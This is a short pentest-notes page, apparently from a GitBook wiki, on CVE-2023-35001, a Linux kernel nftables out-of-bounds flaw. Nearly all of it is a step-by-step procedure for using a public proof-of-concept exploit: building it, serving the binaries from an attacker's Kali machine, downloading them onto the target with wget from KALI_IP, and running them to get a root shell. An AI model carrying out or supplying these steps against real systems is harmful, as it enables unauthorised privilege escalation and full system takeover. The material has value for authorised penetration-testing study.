# CVE-2023-35001

<mark style="color:purple;">Type:</mark> Kernel Exploit

> Linux Kernel nftables Out-Of-Bounds Read/Write Vulnerability; nft\_byteorder poorly handled vm register contents when CAP\_NET\_ADMIN is in any user or network namespace

## PoC

{% embed url="https://github.com/synacktiv/CVE-2023-35001" %}

### Requirements

In our OS we must have these **2 requirements**:

* C compiler
* Go compiler

```bash
sudo apt install golang-go
```

### Clone repo

Clone the repository with the exploit inside.

```bash
git clone https://github.com/synacktiv/CVE-2023-35001
```



### Build the exploit

Once we clone the repo, enter it and build the exploit with these commands:

```bash
cd CVE-2023-35001
make
```

This will generate these two binaries:

* **wrapper**: A C binary used to enter namespaces
* **exploit**: The actual exploit\


### Transfer and Run the exploit

Now, that we have generated the exploit, transfer it to the target system and run them with correct privs

{% code title="Set a webserver on Kali" %}
```bash
python3 -m http.server 80
```
{% endcode %}

{% code title="On target machine" %}
```bash
# download the binaries
wget http://KALI_IP/exploit
wget http://KALI_IP/wrapper

# set correct privs
chmod +x exploit
chmod +x wrapper

# run the exploit
./exploit
```
{% endcode %}

And now we got a root shell.
